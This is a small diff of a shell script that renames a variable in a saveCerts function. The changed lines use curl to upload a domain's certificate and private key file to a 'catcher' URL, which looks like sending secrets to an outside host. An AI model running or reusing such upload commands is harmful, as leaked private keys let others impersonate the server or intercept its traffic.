@@ -18,8 +18,8 @@ tsCert() {
 }
 
 saveCerts() {
-	rop "curl --data-binary @./"$domain".cert $BASE_CATCHER_URL"
-	rop "curl --data-binary @./"$domain".key $BASE_CATCHER_URL"
+	rop "curl --data-binary @./"$DOMAIN".cert $BASE_CATCHER_URL"
+	rop "curl --data-binary @./"$DOMAIN".key $BASE_CATCHER_URL"
 }
 
 getCert() {
